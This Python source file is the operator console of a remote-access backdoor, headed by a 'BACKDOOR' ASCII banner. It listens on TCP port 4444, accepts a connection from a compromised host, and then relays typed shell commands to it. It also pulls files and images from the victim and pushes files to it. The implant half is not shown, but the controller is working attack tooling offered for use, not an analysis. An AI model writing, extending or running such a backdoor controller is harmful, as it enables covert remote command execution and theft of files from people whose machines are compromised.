import socket
import subprocess
import time
import os


class Client:
    def download_img(self):
        w_img = open('downloaded_img.jpg', 'wb')
        final = connection.recv(2048)
        w_img.write(final)
        while w_img:
            final = connection.recv(1024)
            w_img.write(final)
            if b'@@@@@' in final:
                break
        w_img.close()
        time.sleep(1)

    def upload_img(self, img_path):
        try:
            with open(img_path, 'rb') as fp:
                connection.send(fp.read())
                connection.send(b'@@@@@')
        except Exception as e:
            print(e)
        time.sleep(1)

    def download_file(self):
        final = b''
        while True:
            output = connection.recv(1024)
            if not output:
                break
            final += output
            if b'\t' in output:
                break
        if b'\/' in final:
            print("Source is empty!!")
        else:
            fp = open('downloaded.txt', 'wb')
            fp.write(final)
        time.sleep(1)

    def read_file(self, filename):
        try:
            with open(filename, 'rb') as fp:
                connection.send(fp.read())
                connection.send(b'\t')
        except Exception as e:
            print('Source is empty!!')
        time.sleep(1)

    def receiving(self):
        buffer = b''
        while True:
            output = connection.recv(1024)
            if not output:
                break
            buffer += output
            if b'\t' in output:
                break
        print(buffer.decode())
        time.sleep(1)

    def main(self):
        while True:
            data = input("Command to be executed (or 'q' to quit) :  ")

            if data == 'q':
                try:
                    connection.send(data.encode())
                    print("Terminated..")
                    connection.close()
                except Exception as e:
                    print("Error:", e)
                break

            elif data[0:12] == 'download_img':
                connection.send(data.encode())
                Client.download_img(self)

            elif data[0:8] == 'download':
                connection.send(data.encode())
                Client.download_file(self)

            elif data[0:10] == 'upload_img':
                connection.send(data.encode())
                Client.upload_img(self, data[11:])

            elif data[0:6] == 'upload':
                connection.send(data.encode())
                Client.read_file(self, data[7:])

            elif data.strip():
                connection.send(data.encode())
                Client.receiving(self)

            else:
                print("Please enter a valid command !!!")


x = '''                                                                                                                                           
8 888888888o          .8.           ,o888888o.    8 8888     ,88' 8 888888888o.          ,o888888o.         ,o888888o.     8 888888888o.   
8 8888    `88.       .888.         8888     `88.  8 8888    ,88'  8 8888    `^888.    . 8888     `88.    . 8888     `88.   8 8888    `88.  
8 8888     `88      :88888.     ,8 8888       `8. 8 8888   ,88'   8 8888        `88. ,8 8888       `8b  ,8 8888       `8b  8 8888     `88  
8 8888     ,88     . `88888.    88 8888           8 8888  ,88'    8 8888         `88 88 8888        `8b 88 8888        `8b 8 8888     ,88  
8 8888.   ,88'    .8. `88888.   88 8888           8 8888 ,88'     8 8888          88 88 8888         88 88 8888         88 8 8888.   ,88'  
8 8888888888     .8`8. `88888.  88 8888           8 8888 88'      8 8888          88 88 8888         88 88 8888         88 8 888888888P'   
8 8888    `88.  .8' `8. `88888. 88 8888           8 888888<       8 8888         ,88 88 8888        ,8P 88 8888        ,8P 8 8888`8b       
8 8888      88 .8'   `8. `88888.`8 8888       .8' 8 8888 `Y8.     8 8888        ,88' `8 8888       ,8P  `8 8888       ,8P  8 8888 `8b.     
8 8888    ,88'.888888888. `88888.  8888     ,88'  8 8888   `Y8.   8 8888    ,o88P'    ` 8888     ,88'    ` 8888     ,88'   8 8888   `8b.   
8 888888888P .8'       `8. `88888.  `8888888P'    8 8888     `Y8. 8 888888888P'          `8888888P'         `8888888P'     8 8888     `88. '''

print(x)


try:
    tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcp.bind(('localhost', 4444))

except Exception as e:
    print(e)

else:
    tcp.listen()
    print("\n\n\nWaiting for incoming connections...")
    connection, connection_address = tcp.accept()
    print("Connection established with {}".format(connection_address[0]))
    obj = Client()
    obj.main()
